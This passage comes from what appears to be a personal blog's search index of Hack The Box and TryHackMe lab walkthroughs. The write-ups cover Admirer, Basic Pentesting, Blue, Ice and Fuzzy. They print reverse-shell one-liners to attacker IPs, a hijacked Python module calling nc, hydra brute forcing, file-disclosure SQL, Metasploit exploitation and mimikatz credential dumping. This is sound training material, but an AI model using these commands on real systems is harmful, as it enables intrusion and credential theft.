2\u0026gt;\u0026amp;3\u0026quot;);' from the ugly shell. There we go a better shell.\nRoot #  Now let\u0026rsquo;s get root, but first I upgraded the shell again with the command python3 -c 'import pty; pty.spawn(\u0026quot;/bin/bash\u0026quot;)'. Okay so I added my ssh public key to the authorized_keys file because I want to be able to reconnect fast if I mess up. This probably isn\u0026rsquo;t advisable. This also allows me to scp pspy onto the machine to monitor the processes running. I notice that the files in the /etc/update-motd.d get replaced by there backups frequently. Let\u0026rsquo;s check them out. It looks like we have permission to edit these files in the update-motd.d directory. Let\u0026rsquo;s try and add some code and ssh into the sysadmin user to escalate privileges. This is a long shot, but here goes nothing.\nFirst I started listening on my machine on port 9999 then I added the following code to the file 00-header.\npython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026quot;10.10.14.100\u0026quot;,9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026quot;/bin/sh\u0026quot;,\u0026quot;-i\u0026quot;]);' Next I had to ssh into the machine quickly before my script was over written. Once I ssh back into the machine as sysadmin this reverse shell was activated on my listening port. When I type whoami, I am root.\n"});index.add({'id':10,'href':'/posts/hack-the-box/admirer/','title':"Admirer",'section':"Hack the Box",'content':"This was one of the first boxes I completed and it was difficult. It took me the longest time to enumerate the directories and finally find what I was looking for. Overall, I learned more about using my resources and double checking where I had thought I already looked. Good luck to all who want to try this box!\nTools #   nmap firefox gobuster nikto hydra netcat python mysql  Walkthrough #  First thing\u0026rsquo;s first, let\u0026rsquo;s do the nmap scan. I use the command sudo nmap -sS -sV $IP.\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-11 17:04 EDT Nmap scan report for 10.10.10.187 Host is up (0.056s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0) 80/tcp open http Apache httpd 2.4.25 ((Debian)) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 7.99 seconds As usual for HTB machines there is a web server on port 80 and SSH is open. Let\u0026rsquo;s start looking around. While we are looking at the webpage I am going to run a gobuster scan in the background with the command gobuster dir -u http://$IP -w /usr/share/dirb/wordlists/common.txt.\nWhile looking at the website I went to robots.txt and found out that there is a directory called /admin-dir. This is something we should checkout. If we try and navigate to the directory, we are not allowed to view it, that\u0026rsquo;s okay, we will get there eventually! Let\u0026rsquo;s see the output of our gobuster scan.\nLooks like we didn\u0026rsquo;t find too much we didn\u0026rsquo;t already know.\n=============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.10.187 [+] Threads: 10 [+] Wordlist: /usr/share/dirb/wordlists/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2020/06/11 17:12:10 Starting gobuster =============================================================== /.hta (Status: 403) /.htaccess (Status: 403) /.htpasswd (Status: 403) /assets (Status: 301) /images (Status: 301) /index.php (Status: 200) /robots.txt (Status: 200) /server-status (Status: 403) =============================================================== 2020/06/11 17:12:36 Finished =============================================================== I am going to run another gobuser scan and I added the argument -x .php,.txt,.html so that I can look for file extensions. Again no results, so I am going to try one more time with the wordlist /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt. This list is over 20 times larger than the last one. I might be beating a dead horse here but hopefully something interesting will pop up.\nOkay so I am back after a while and I have a new idea. I am trying to enumerate the home directory, but what about the directory that we had found earlier. Let\u0026rsquo;s try to use the command gobuster dir -u http://$IP/admin-dir/ -w /usr/share/dirb/wordlists/common.txt -x .php,.txt,.html. We found something new! It looks like there is something at the domain http://$IP/admin-dir/contacts.txt. It even gives us a 200 response code so we should be able to view its contents. Look\u0026rsquo;s like it has the names and email addresses of designers and developers of the admirer app. This might help us brute force an ssh login. Let\u0026rsquo;s try using hydra on a set of usernames that include the names we found in the file. Here is the command I used hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt $IP ssh.\nWhile waiting for hydra to run I also tried an anonymous ftp login but I just got permission denied. Also if we don\u0026rsquo;t find any ssh credentials we could always try hydra on ftp. Wait a second\u0026hellip; haha I am such a fool. I bet the ssh and ftp passwords are the same. So if I can\u0026rsquo;t brute force ssh the I probably will not be able to use hydra on ftp. While waiting for hydra and another gobuster scan to be completed, I stumbled upon the HTB fourms and read a few posts about this box. There was a hint about this box\u0026rsquo;s name being similar to that of a database, so I did a quick google search and found this link. There is a database called adminer. That is pretty similar to the name of our box. Let\u0026rsquo;s read up some more about this database and maybe do some manual enumeration.\nAfter trying a few different paths from adminer's GitHub page I didn\u0026rsquo;t find much.\n adminer/index.php - Run development version of Adminer editor/index.php - Run development version of Adminer Editor editor/example.php - Example customization plugins/readme.txt - Plugins for Adminer and Adminer Editor adminer/plugin.php - Plugin demo adminer/sqlite.php - Development version of Adminer with SQLite allowed editor/sqlite.php - Development version of Editor with SQLite allowed adminer/designs.php - Development version of Adminer with adminer.css switcher compile.php - Create a single file version lang.php - Update translations tests/katalon.html - Katalon Automation Recorder test suite This is a list of the ones I tried. I also started a nikto scan using the command nikto -host http://$IP. My nikto scan didn\u0026rsquo;t show much, a little disappointing. However, we got a new file from another gobuster scan. I used the command gobuster dir -u http://$IP/admin-dir/ -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -x .php,.txt,.html. It took quite a while, but I found the file /admin-dir/credentials.txt. It looks like it has some WP credentials, ftp credentials and some email credentials. Let\u0026rsquo;s see what the ftp login gets us.\nAfter trying to log in we are successful, awesome! There is a database dump and some compressed file, let\u0026rsquo;s exfiltrate both of them so we can take a look around. We were stuck in the home directory of the ftpuser, so this is all we could get.\nIn the html.tar.gz folder we got all the contents on the website. You can find the ungziped version in the directory html. I found some interesting file in the directory utility-scripts. There are some .php files having to do with administrator privileges, so let\u0026rsquo;s investigate those in the web browser and see if we can access them.\nSomething I found in the utility-scripts/info.php file that I think is funny is that it says Adminer version 4.9 is running, but on the Adminer GitHub page the latest version is 4.7. We can also access the page utility-scripts/admin_tasks.php on the website. This might be a lead! From this page we can see that there is a user named waldo logged into the machine. This person also appeared on the credentials page exfiltrated from the ftp server. Let\u0026rsquo;s see if we can ssh into the machine on the user waldo with any of the credentials we found. Ouch and after trying the server with all the passwords we have found so far we are not lucky. I guess it is time to look at dump.sql.\nWell another disappointing lead, it looks like the dump.sql file just contains the descriptors for the images on the server. Boo hoo.\nWhat\u0026rsquo;s strange is that of all the files that we exfiltrated from the utility-scripts directory the only file that does not exist is db_admin.php. I don\u0026rsquo;t know the significance, but it is something to note.\nOkay so I finally found something interesting. I used ffuf -u http://$IP/utility_scripts/FUZZ -w /usr/share/dirb/wordlists/big.txt -e .php,.txt,.html. This popped up that there is a file called adminer.php. This gives us a login page. I am not sure what the DB stuff means, but we can try and use the credentials we have found in hopes that we can use something. I tried using the credentials waldo::Wh3r3_1s_w4ld0? but didn\u0026rsquo;t have any luck. However at the top of the page there is a version number: 4.6.2. This is not the most recent version so let\u0026rsquo;s look up some exploits. Turns out that this version of adminer has a big file disclosure vulnerability. You can read about it here and here.\nI have been having a lot of trouble starting my mysql server on my machine. I wasn\u0026rsquo;t able to connect for a while. However here is what I figured out.\nUse the command sudo service mysql start to start the server. Next use the command sudo mysql to connect to the mysql shell. Now here goes a series of commands.\nCREATE DATABASE admirer; use admirer; CREATE USER 'htb'@'%' IDENTIFIED BY 'hacker'; GRANT ALL PRIVILEGES ON * . * TO 'htb'@'%'; FLUSH PRIVILEGES; CREATE TABLE test(data VARCHAR(255)); Now that we have user and it\u0026rsquo;s privileges set we need to set the bind-address to 0.0.0.0 in /etc/mysql/mariadb.conf.d/50-server.cnf.\nNow that this is all set we can connect to our server on the login page by filling out the following information.\nServer: 10.10.14.22 (this your internal htb ip, find it on the Access page) username: htb password: hacker database: adminer Then boom we connect. We have come a long way to get this far! So close to user I can feel it. Now we need to try and exfiltrate the user\u0026rsquo;s password. Let\u0026rsquo;s investigate. We can enter SQL commands into this website. So based on the command suggested in the second article, we should be able to use LOAD DATA LOCAL INFILE '/etc/shadow' INTO TABLE test, looks like we are not allowed to view that file\u0026hellip; surprise. Let\u0026rsquo;s try using the query LOAD DATA LOCAL INFILE '../index.php' INTO TABLE test because that is where we found some credentials from the files we got via ftp. This is what we found:\n$username = \u0026quot;waldo\u0026quot;; $password = \u0026quot;\u0026amp;\u0026lt;h5b~yK3F#{PaPB\u0026amp;dA}{H\u0026gt;\u0026quot;; $dbname = \u0026quot;admirerdb\u0026quot;; If we try using these credentials to ssh into the machine they work! User success. Here is the hash that was on my machine f0c71b0bad8032c9cf59393f1eb7d3e5.\nNow to try and escalate to root! Right off the bat I ran the command sudo -l to see what commands waldo could run. We can see that there is a script called admin_tasks.sh if we try and run it we get the same options that were on the web interface. I tried to create a password backup but was unable due to insufficient permissions.\nThere is also a few backup that have been created. If we do the command find \\ | grep .bak | grep .bak the we can find another password backup that has been created. Unfortunately we are not allowed to access this file again. I tried catting out the .bash_history of the users, but it looks like they are all being piped to /dev/null.\nNow I downloaded the post exploit script linenum to the server and ran it to see if anything will stand out. I got lenenum from the repo here. Okay\u0026hellip; so I don\u0026rsquo;t really know what I am reading, but nothing really stands out to me. However after doing sudo -l again I realized that I could run the admin_tasks.sh as root. So I can create the passwd.bak file. However I still cannot read it. Let\u0026rsquo;s see if we can alter the code in the shell script. I am silly. My target is not passwd.bak because I can already read it at /etc/passwd.\nRight now my idea is to some how abuse the fact that when we do sudo -l that we have something to do with SETENV. I am thinking that we can preserve the EUID that the shell script is executed as. Because we know that we can execute admin_tasks.sh as root. So there has got to be a way that we can maintain the EUID from this process, essentially making us the root user. There is also a call to the file backup.py in our shell script that we have permission to run. Maybe this could be an attack vector as well, because technically the backup.py gets run as root as well. Let\u0026rsquo;s do some research. I found this article. It has to do with being able too write to the file that the python module is importing. Let\u0026rsquo;s see if we can locate this shutil.py file. Well it looks like we do not have permission to edit the shutil.py file. But what if we can create our own and make the python file being ran to look there. Let\u0026rsquo;s try this in waldo's home directory. I would say do it in /tmp, but the machine deletes /tmp frequently so it would be a pain to work in. Okay so let\u0026rsquo;s create a file called shutil.py. In there we need the same method signature that is in the real shutil.py file for the make_archive method. In this method we don\u0026rsquo;t need any of the arguments, we just need the method to be called. So I want to spawn a reverse shell. Here is what I have.\nimport os def make_archive(a, b, c): os.system(\u0026quot;nc 10.10.14.29 1234 -e'/bin/sh'\u0026quot;) Now from here I thought we could just run the script from this directory, but that is not the case. Turns out that this file needs to be in the python sys.path I tried adding it to the sys.path using some choppy code, but it did not work. Then I read about setting the environmental variable PYTHONPATH to so I set it to /home/waldo. That didn\u0026rsquo;t work either. But after a hint, it turns out that what we need to do is run it all together as SUDO. First set up your listener on your local machine. Here we run the command nc -lvnp 1234, then on the server we need to run the following command: sudo PYTHONPATH=/home/waldo /opt/scripts/admin_tasks.sh then select 6. If you set up your listener on your local machine then it should work. Type whoami on the reverse shell and you are root! Congratulations. Now to cat out the /root/root.txt file. Overall this was a very difficult box for me. I probably worked on it for 8+ hours, but I feel like I learned a lot. Onto the next box!\nWorking Credentials: ftpuser::%n?4Wz}R$tTF7 waldo::\u0026amp;\u0026lt;h5b~yK3F#{PaPB\u0026amp;dA}{H\u0026gt; URLS: |$IP/admin-dir/ ||- contacts.txt ||- credentials.txt |$IP/utility-scipts/ ||- info.php ||- admin_tasks.php ||- phptest.php ||- adminer.php |$IP/server-status "});index.add({'id':11,'href':'/posts/try-hack-me/basic-pentesting/','title':"Basic Pentesting",'section':"Try Hack Me",'content':"This Try Hack Me room guided users through the basics of web application pentesting. I learned about SMB enumeration and bruteforcing domains. This walkthrough also introduces bruteforcing logins with hydra and once the machine is compromised, elevating user privileges.\nTools #   nmap gobuster hydra linenum  Walkthrough #  First things first let\u0026rsquo;s scan the box. I used the command nmap -sV -sS $IP and redirected the output to the file nmap/nmap.txt. It looks like there is an http server on this box. Let\u0026rsquo;s try and connect to it to see if it is actually accessible. Doesn\u0026rsquo;t look like we can access it. Let\u0026rsquo;s run a gobuster scan on the domain to just see if we can access any other pages. After running the command gobuster dir -u http://$IP:80 -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt, we can see that there is a directory called development. Let\u0026rsquo;s go to it in the browser and take a look.\nThis is a great find because it indexes what we have in the directory. It looks like theses are internal notes.\n2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat to host that on this server too. Haven't made any real web apps yet, but I have tried that example you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm using version 2.5.12, because other versions were giving me trouble. -K 2018-04-22: SMB has been configured. -K 2018-04-21: I got Apache set up. Will put in our content later. -J For J: I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials, and I was able to crack your hash really easily. You know our password policy, so please follow it? Change that password ASAP. -K To sum up the notes, it sounds like the user J has a weak password. Our nmap scan showed that then ssh port was open we we might be able to try and brute force some credentials with hydra. After doing some research it looks like hydra might not be the first step. To figure out the users we need to enumerate the SMB port with the tool enum4linux. Use the command enum4linux -a $IP to enumerate the SMB configuration. I outputted this to a file called smb_enum.txt it found two users, jan and kay. Now that we have these usernames we can use hydra to bruteforce jan\u0026rsquo;s ssh password since we know she has a weak password. Use the command hydra -l jan -P /usr/share/wordlists/rockyou.txt $IP so start the attack. Once the attack has been completed we can see that jan\u0026rsquo;s password is armando.\nusername: jan password: armando Next I enumerated the possible exploits on our target machine. I used this article to learn how to use LinEnum to scan for vulnerabilities on the target machine. First I sshed into the machine then navigated to /var/tmp so that I could copy the LinEnum script onto the machine. Then I ran the script. It looks like kay might had misconfigured her ssh files. If we copy her private key and has it we should be able to find out her password with John. First exfiltrate the private key. Next, use the command python /usr/share/john/ssh2john.py id_rsa \u0026gt; id_rsa.hash. Now we can use JtR to break this hash against the RockYou wordlist. Use the command /usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash against the has to crack it. And soon enough the password pops out as beeswax.\nusername: kay password: beeswax Now if we try to connect to the server with user kay we can use her passphase to use the private key. Use the command ssh -i id_rsa kay@$IP then enter beeswax when prompted for the private key password. If you get errors saying that the private key has bad permissions you can use the command chmod 600 id_rsa to fix that. Now we have access to the user kay. Cat out the password.bak file to get the final password and we are done! Congratulations!\nAfter some more investigating, it also looks like we may even be able to become the root user from kay. If we run the command sudo -l and put in the password we just got we can see that kay can run sudo commands. So if we try to use the command sudo su we should be able to switch our user to root. And what do you know it works! There is also a flag in /root/flag.txt check it out.\n"});index.add({'id':12,'href':'/posts/try-hack-me/blue/','title':"Blue",'section':"Try Hack Me",'content':"Blue explores the dated, but widespread EternalBlue exploit. This exploit was used in the WannaCry ransomware attack which crippled healthcare systems and spread to millions of computers in a matter of days. In this room we are prompted to exploit this vulnerability using Metasploit.\nTools #   metasploit nmap  Walkthrough #  First things first. Let\u0026rsquo;s conduct a scan on the box using the command nmap -sS -sV -A $IP.\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-05-24 00:27 EDT Nmap scan report for 10.10.203.178 Host is up (0.14s latency). Not shown: 991 closed ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 3389/tcp open ssl/ms-wbt-server? |_ssl-date: 2020-05-24T04:28:55+00:00; -1s from scanner time. 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49158/tcp open msrpc Microsoft Windows RPC 49160/tcp open msrpc Microsoft Windows RPC Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 1h14m59s, deviation: 2h30m00s, median: 0s |_nbstat: NetBIOS name: JON-PC, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 02:fd:24:c1:40:16 (unknown) | smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1) | OS CPE: cpe:/o:microsoft:windows_7::sp1:professional | Computer name: Jon-PC | NetBIOS computer name: JON-PC\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2020-05-23T23:28:50-05:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2020-05-24T04:28:50 |_ start_date: 2020-05-24T04:27:10 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 157.79 seconds Looking at the results the machine is running Windows 7 Professional 7601. If we google this version number we can find out that this version might be vulnerable to the \u0026ldquo;EternalBlue\u0026rdquo; (MS17-010) vulnerability. You can read more about it here. Now that we are done with recon, we can begin to try and gain access.\nTo gain access we are going to be using metasploit. To start metasploit use the command msfconsole. Then let\u0026rsquo;s ping the server just to be sure that we can connect. ping $IP. In the metasploit console we can use the command search MS17-010 to see exploits we can use. Next we can see payload 3 that has the title exploit/windows/smb/ms17_010_eternalblue. This is the code will will use to run against the machine. Now that these payloads are found we can use the command use 3 to load the payload. Now that we have our payload set we can the options. Use the command show options to see which options we need to set in order to use our attack. We can see that the only field that is required but not set is the RHOSTS. To set this field we can use the command set RHOSTS 10.10.100.140. Now when we do show options again we should be able to see our target IP address. Now that all the options are set run the command exploit to launch our payload.\nNow that we have access to the machine that we want, we can upgrade our shell to a meterpreter shell. The easy way to do this, given that we have already put the shell in the background using CTRL-Z. We can use the command sessions to see the sessions. In my instance the session we are interested in has the ID 1. So I will use the command sessions -u 1. But you can also use the module post/multi/manage/shell_to_meterpreter, then use the command use post/multi/manage/shell_to_meterpreter. Now that we are using the post exploit module we can set the SESSION option to the session ID. Use the command set SESSION 1. Now that the session is set, let\u0026rsquo;s fire up the meterpreter. Now let\u0026rsquo;s run. Once execution is complete press enter and select the new meterpreter session from our available sessions. Use the command sessions 2. Now that we are in the meterpreter shell we can use the command shell then whoami to verify that we are the nt authority\\system user. Now let\u0026rsquo;s take a look at the processes using the command ps. Write down a process id towards the bottom of the list to migrate to. This might be unstable and not work the first time. If it fails try again (this is what tryhackme says). I used the LiteAgent.exe process and it worked. Now that we have migrated the process let\u0026rsquo;s get the user\u0026rsquo;s hashes. Use the command hashdump and if the privileges were escalated correctly we should see all the users and their hashes. We can also see that there is a user named \u0026lsquo;Jon\u0026rsquo;. Now to crack his password. I used the website CrackStation. To crack the password. Turns out this user\u0026rsquo;s password is alqfna22.\nThe first flag can be found in the root directory in the file flag1.txt. The third flag is in the user Jon\u0026rsquo;s documents. The second flag is found in the directory C:/Windows/system32/config. This is also the directory where windows passwords are stored. Interesting stuff.\nThis was a fun box and I feel like I have a better understanding of navigating through Windows directories and using the metasploit.\n"});index.add({'id':13,'href':'/posts/try-hack-me/ice/','title':"Ice",'section':"Try Hack Me",'content':"Ice is the extension to the Blue room. In this room we learn more about windows recon, exploitation and escalation. This box uses a vulnerable service called Icecast which allows us to access the machine using metasploit, then elevate those privileges by abusing a spool process.\nTools #   nmap metasploit  Walkthrough #  First things first. Nmap scan. I used the command sudo nmap -sV -A -sS $IP then piped the output to nmap/nmap.txt.\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-05-26 18:31 EDT Nmap scan report for 10.10.220.176 Host is up (0.13s latency). Not shown: 989 closed ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 5357/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Service Unavailable 8000/tcp open http Icecast streaming media server |_http-title: Site doesn't have a title (text/html). 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49158/tcp open msrpc Microsoft Windows RPC 49159/tcp open msrpc Microsoft Windows RPC 49161/tcp open msrpc Microsoft Windows RPC No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.80%E=4%D=5/26%OT=135%CT=1%CU=40177%PV=Y%DS=2%DC=T%G=Y%TM=5ECD99 OS:36%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10D%TI=I%CI=I%II=I%SS=S%TS OS:=7)SEQ(SP=107%GCD=1%ISR=10D%TI=I%CI=I%TS=7)OPS(O1=M508NW8ST11%O2=M508NW8 OS:ST11%O3=M508NW8NNT11%O4=M508NW8ST11%O5=M508NW8ST11%O6=M508ST11)WIN(W1=20 OS:00%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M5 OS:08NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80 OS:%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q OS:=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A OS:=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%D OS:F=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL OS:=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z) Network Distance: 2 hops Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s |_nbstat: NetBIOS name: DARK-PC, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 02:00:58:2b:54:ae (unknown) | smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1) | OS CPE: cpe:/o:microsoft:windows_7::sp1:professional | Computer name: Dark-PC | NetBIOS computer name: DARK-PC\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2020-05-26T17:33:15-05:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2020-05-26T22:33:15 |_ start_date: 2020-05-26T22:29:10 TRACEROUTE (using port 143/tcp) HOP RTT ADDRESS 1 232.30 ms 10.9.0.1 2 232.43 ms 10.10.220.176 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 107.56 seconds From the results it looks like there is a webserver open on port 8000 and port 5357. On port 800 there is an interesting software called Icecast running. Let\u0026rsquo;s do some research about this. It looks like Icecast is a software that allows a computer to be a media server.\nTo learn about the vulnerability this machine has TryHackMe gave us a big hint. It told us that there is a vulnerability with the level 7.5 on cvedetails.com. There are two exploits with this level on cvedetails that deal with Icecast. The one we are looking for is CVE-2004-1561. Its type is execute code overflow. Now that we know what exploit this machine might fall victim too let\u0026rsquo;s fire up metasploit and load out module in. To do this type msfconsole then search icecast and finally use 0 because this exploit is the only on in metasploit for Icecast. Next we will use show options to see what we need in order to execute the exploit. Turns out the required option is RHOSTS. Now let\u0026rsquo;s set the RHOSTS to our target IP. Use the command set RHOSTS 10.10.220.176. Finally lets run the exploit! Use the exploit command.\nNow that we have a foothold we can being escalating our privileges. First TryHackMe asks what shell we are using. And for this exploit metasploit is nice enough to throw us into the meterpreter shell. Now we can take a look at the processes running on the machine. To do this we can run the command ps to see the current processes. Turns out that a user named \u0026lsquo;Dark\u0026rsquo; is running Icecast. Now the build of Windows that this machine is running is 7601. I just took a look at my nmap scan to figure this out. We can also use the command sysinfo. This also tells us that the machine is on an \u0026lsquo;x64\u0026rsquo; architecture. Now let\u0026rsquo;s run run post/multi/recon/local_exploit_suggester which will suggest us some exploits to run against this machine. After running these are our results:\n[+] 10.10.220.176 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable. [+] 10.10.220.176 - exploit/windows/local/ikeext_service: The target appears to be vulnerable. [+] 10.10.220.176 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable. [+] 10.10.220.176 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable. [+] 10.10.220.176 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable. [+] 10.10.220.176 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable. [+] 10.10.220.176 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable. [+] 10.10.220.176 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable. TryHackMe wants us to use the first one. Suspend the current session using CTRL-Z then use the command use exploit/windows/local/bypassuac_eventvwr to load the exploit. Then set the session to 1 using set SESSION 1 (This might be different depending on how you used metasploit. If you need to check use the command sessions). Now that we have set the session we need to set the listener ip. We can type ip addr in the command line to get out TryHackMe address. Your TryHackMe IP should be the one under the tun0 section. You can also check this in the access tab on the website. In my case my internal IP is 10.9.12.124. Now run the exploit and connect to the newly created session using the command sessions #. Now that we have connected we can use the command getprivs to see what processes we have access to. One of these process should allow us to take ownership of files. Based on the list output from getprivs it looks like \u0026lsquo;SeTakeOwnershipPrivilege\u0026rsquo; is what we are looking for. Now that we know how to gain access to what we want we need to do it.\nNow that we are on the machine we are running on a process that is being run under the \u0026lsquo;Dark\u0026rsquo; user. However even though we have escalated privileges as \u0026lsquo;NT AUTHORITY\\SYSTEM\u0026rsquo; we are not in an escalated process. To get to an escalated process we can use the ps command to see the processes running. Then we can migrate to a process that is running as NT AUTHORITY\\SYSTEM. For this box we are going to pick the spoolsv.exe process because is it running on the same architecture that the lsass service is running. lsass is our target. Now let\u0026rsquo;s migrate. On my box the spoolsv.exe process id is 1400 so I will use the command migrate 1400 to move to that process. Next I am going to load in the meterpreter extension Mimikatz using the command load kiwi, kiwi being the Minikatz version. Minikatz will allow us to dump the passwords. To get the credentials use the command creds_all. We can get all the hashes using the command hashdump. We can also watch the user\u0026rsquo;s screen using screenshare or listen to their microphone using the command record_mic. We can also change time stamps using the command timestomp. This could be used to confuse investigators after an attack. If we wanted to we could also create a \u0026lsquo;golden ticket\u0026rsquo; with Minikatz that allows us to easily authenticate other users on the system.\n"});index.add({'id':14,'href':'/posts/hack-the-box/challenges/fuzzy/','title':"Fuzzy",'section':"Challenges",'content':"Fuzzy challenged the user on the basics of fuzzing and taught me how to use wfuzz and other techniques to learn information about my target machine. I suggest anyone who would like to learn about fuzzing take on this challenge.\nTools #   gobuster wfuzz  Walkthrough #  First thing I am going to try and do is navigate to robots.txt, but it looks like it is not there. Next we are going to run gobuster to figure out if there are any other server urls that we can navigate to and exploit. Dirbuster found a directory called /api/.\nNext we are going to do another scan in the api directory using the command gobuster dir -u http://docker.hackthebox.eu:31883/api -w /usr/share/wordlists/dirb/common.txt -x .php,.html,.htm,.js. I used the -x argument so specify the extensions I wanted to search for. You can see the results in dirb_file_out.txt. We found the file action.php and when we try to visit it in the browser it says that there needs to be a parameter.\nTo find the hidden parameter we can use wfuzz to fuzz the parameter name and find out what the request returns. Let\u0026rsquo;s run the command wfuzz -c -w /usr/share/dirb/wordlists/big.txt http://docker.hackthebox.eu:31883/api/action.php?FUZZ=test to start fuzzing the parameter names. Most of our responses are returning 4 words. If we user grep -v we can filter out all the responses that contain 4 words and maybe find the parameter name that returns something else. Run the command cat paramfinder_out.txt | grep -v \u0026quot;4 W\u0026quot; and we see that reset returns something with 5 words. Let\u0026rsquo;s navigate to the web browser and see what is being returned. If you take a look at the web browser it seems that we are entering the wrong account ID. Well that is something. It looks like we found the parameter for this action.php file. Now to find our user.\nIn order to find the user we are going to use another wfuzz scan. Who would have thought that a challenge named \u0026ldquo;fuzzy\u0026rdquo; would require this much fuzzing. We can fuzz the user ID by using the range argument for wfuzz. You can read about it here. Let\u0026rsquo;s use the command wfuzz -z range,0-100 http://docker.hackthebox.eu:31883/api/action.php?reset=FUZZ \u0026gt; digitfuzz.txt. These results can be found in digitfuzz.txt. Again we notice that most of the parameter values return 5 words so let\u0026rsquo;s try an grep -v again to filter out all the 5 word returns. Using the command cat digitfuzz.txt | grep -v \u0026quot;5 W\u0026quot; returns to us the user ID of the user who\u0026rsquo;s reset was successful. Now if we go to the web browser and navigate to http://docker.hackthebox.eu:31883/api/action.php?reset=[ID] replacing [ID] with the ID that was found by our wfuzz scan you should be able to see the flag.\n"});index.add({'id':15,'href':'/posts/try-hack-me/vulnversity/','title':"Vulnversity",'section':"Try Hack Me",'content':"Vulnversity walks through how to preform recon on targets and look for possible points of entry for payloads such as reverse shells. On this box port 3333 is running a webserver. After dirbusting the webserver we find a path called internal where we are able to upload php files. From there we can upload a reverse shell in php and get access to the machine. Once on the machine we check file permissions to find an avenue to escalate our privileges.\nTools #   nmap gobuster  Walkthrough #  export IP=10.10.22.134 [Task 2] #  This task is centered around using nmap. A port scanner that can give us information from what ports are open on a host, to the software running on those open ports. For this box we are using the IP 10.10.22.134, and to conduct our nmap scan we can use the command nmap -sV -A -v 10.10.22.134. I am using the flags -sV to tell us the version of services running on each port, -A to enable OS 